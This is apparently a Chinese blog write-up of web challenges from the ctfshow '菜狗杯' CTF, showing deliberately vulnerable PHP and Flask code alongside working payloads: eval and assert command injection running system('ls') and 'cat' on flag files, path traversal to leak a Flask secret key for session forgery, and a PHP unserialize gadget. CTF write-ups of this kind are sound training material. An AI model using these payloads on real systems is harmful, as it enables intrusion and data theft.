<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshow_菜狗杯 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="一个半小时是三个半小时,三个半小时是210分钟">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow_菜狗杯">
<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-caogou/index.html">
<meta property="og:site_name" content="Iz0fPriestess">
<meta property="og:description" content="一个半小时是三个半小时,三个半小时是210分钟">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
<meta property="article:published_time" content="2024-06-28T09:22:55.000Z">
<meta property="article:modified_time" content="2024-07-05T11:04:04.494Z">
<meta property="article:author" content="Creexile">
<meta property="article:tag" content="绕过">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="隐写">
<meta property="article:tag" content="PyJail">
<meta property="article:tag" content="整形溢出">
<meta property="article:tag" content="二维码">
<meta property="article:tag" content="文件操作">
<meta property="article:tag" content="盲水印">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-caogou/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctfshow_菜狗杯',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-05 19:04:04'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshow_菜狗杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-06-28T09:22:55.000Z" title="Created 2024-06-28 17:22:55">2024-06-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-05T11:04:04.494Z" title="Updated 2024-07-05 19:04:04">2024-07-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">8.2k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Web</h1>
<hr>
<h2 id="Web签到"><a class="header-anchor" href="#Web签到">¶</a>Web签到</h2>
<p>嵌套: Cookie传参 -&gt; POST传参 -&gt; GET传参 -&gt; REQUEST传参 -&gt; eval执行</p>
<p>假如Cookie中传入<code>CTFshow-QQ群:=a</code>, 那么就会出现<code>$_POST['a']</code>, 假如POST传入的值为a=b，那么就会得到<code>$_GET['b']</code>，接着假如GET传入b=c就会得到<code>$_REQUEST['c']</code></p>
<p>假如再get传入c=123那么前面这一部分<code>($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]])</code>的值就是123了。但是最终是需要通过数组下标的方式给到eval的。所以c传个数组就可以了: <code>c[6][0][7][5][8][0][9][4][4]=system('ls');</code></p>
<p>接下来命令执行就不多说了, 如果发不出去就用url编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET: ?b=c&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat%20%2ff1agaaa&#x27;);</span><br><span class="line">POST: a=b</span><br><span class="line">Cookie: CTFshow-QQ%e7%be%a4:=a</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623205506489.png" alt="image-20240623205506489"></p>
<h2 id="我的眼里只有"><a class="header-anchor" href="#我的眼里只有">¶</a>我的眼里只有$</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);  <span class="comment">// 36个$</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>本题就是如何闭合这36个$, 生成payload的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_str = <span class="string">&#x27;_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    my_str += <span class="string">&#x27;=&#x27;</span> + <span class="built_in">chr</span>(<span class="number">97</span>+i)+<span class="string">&#x27;&amp;&#x27;</span> + <span class="built_in">chr</span>(<span class="number">97</span>+i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    my_str += <span class="string">&#x27;=&#x27;</span> + <span class="built_in">chr</span>(<span class="number">65</span>+i)+<span class="string">&#x27;&amp;&#x27;</span> + <span class="built_in">chr</span>(<span class="number">65</span>+i)</span><br><span class="line">my_str += <span class="string">&quot;=system(&#x27;ls /&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_str)</span><br><span class="line"><span class="comment"># _=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span></span><br></pre></td></tr></table></figure>
<p>命令执行就不再赘述</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623212128207.png" alt="image-20240623212128207"></p>
<h2 id="抽老婆"><a class="header-anchor" href="#抽老婆">¶</a>抽老婆</h2>
<p>本来想应该是通过伪造图片的请求来读取文件的, 发现不行</p>
<p>最后在源码这里找到下载方式, 这个下载方式和旁边的注释很可疑, 可能会有任意文件下载</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn layui-btn-lg layui-btn-radius layui-btn-normal&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/download?file=6249ab7d7d4f7993619c2a22cb426d03.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;&quot;</span>&gt;</span>下载老婆<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 特意为了不会右键另存为的同学做了这个功能，我真的太温柔了 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用<code>/download?file=1111</code>报错,可以发现是Flask框架, <a target="_blank" rel="noopener" href="http://xn--app-tu9ds88awvvgo5by43a.py">配置文件在app.py</a>, ``/download?file=…/…/app.py`下载源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/11/07 09:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：抽老婆，哇偶~</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getwifi&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getwifi</span>():</span><br><span class="line">    session[<span class="string">&#x27;isadmin&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">    wifi=random.choice(os.listdir(<span class="string">&#x27;static/img&#x27;</span>))</span><br><span class="line">    session[<span class="string">&#x27;current_wifi&#x27;</span>]=wifi</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;getwifi.html&#x27;</span>,wifi=wifi)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>(): </span><br><span class="line">    filename=request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你想干什么？&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> send_file(<span class="string">&#x27;static/img/&#x27;</span>+filename,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret_path_U_never_know&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;isadmin&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:flag&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>/secret_path_U_never_know</code>路由有一个session验证, 直接用上得到的密钥和flasksession伪造工具即可伪造<code>isadmin=True</code>,发包即可拿到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623224307361.png" alt="image-20240623224307361"></p>
<h2 id="一言既出"><a class="header-anchor" href="#一言既出">¶</a>一言既出</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;一言既出，驷马难追!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<ol>
<li>先满足<code>$_GET['num']</code>的值等于114514</li>
<li>使用<code>assert()</code>函数判断给定的表达式是否为真。如果表达式为假，则会抛出一个致命错误。</li>
<li>表达式为<code>intval($_GET[num])==1919810</code>，即将<code>$_GET['num']</code>强制转换为整数后，判断是否等于1919810, 如果表达式为真，则程序继续执行。</li>
</ol>
<p>有好几种解:
num=114514进入条件后, 通过 # 注释掉后面的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514);%23</span><br><span class="line"></span><br><span class="line"># 再给一点类似原理的:</span><br><span class="line">?num=114514);//</span><br><span class="line">?num=114514);(19199810	# 闭合后给后面的判断也变为真</span><br><span class="line">?num=114514)==1 or system(&#x27;ls&#x27;);%23	# 恒等于1后用or注入其他命令</span><br><span class="line">?num=114514)==1%20or%20system(%27ls%27);%23</span><br></pre></td></tr></table></figure>
<p>num=114514进入条件然后加上一个数, 使得num变为1919810</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=114514%2b1805296</span><br><span class="line">?num=114514)==1 or system(&#x27;ls&#x27;) or (1919810</span><br></pre></td></tr></table></figure>
<blockquote>
<p>URL中的+和空格
+如果直接写在url里面, 只会被当成一个字符串输出, 而不是作为运算符号, 所以用%2b
空格则表示单词之间的间隔
另外, 单引号: %27 , 井号: %23</p>
</blockquote>
<h2 id="Webshell"><a class="header-anchor" href="#Webshell">¶</a>Webshell</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo &quot;Hello World!&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$serializecmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="variable">$unserializecmd</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializecmd</span>);</span><br><span class="line">        <span class="variable">$unserializecmd</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>非常简单的反序列化, 直接修改cmd的值就行, 完全没有什么难度, 至于这么提取flag, 通配符会出手:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;	<span class="comment">// 修改这里就可以了, cat fl*</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Webshell</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也可以将该目录下所有文件内容输出到一个不含flag的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:7:&quot;cat fl*&quot;;&#125;	# 然后看F12</span><br><span class="line">O:8:&quot;Webshell&quot;:1:&#123;s:3:&quot;cmd&quot;;s:13:&quot;cat * &gt; 1.txt&quot;;&#125;	# 后面再读取1.txt就可以了</span><br></pre></td></tr></table></figure>
<h2 id="化零为整"><a class="header-anchor" href="#化零为整">¶</a>化零为整</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你太长了！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;大牛&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我还在想url编码后不是三个嘛, 结果发现是拼接, 变量是一位就行, 而本身url编码后也只是占了一个位置, <strong>不是三个</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: </span><br><span class="line">?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</span><br></pre></td></tr></table></figure>
<h2 id="无一幸免"><a class="header-anchor" href="#无一幸免">¶</a>无一幸免</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>非预期:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入 ?0=1</span><br></pre></td></tr></table></figure>
<p>看了WP, 这肯定不对的啊? 哦有个fixed</p>
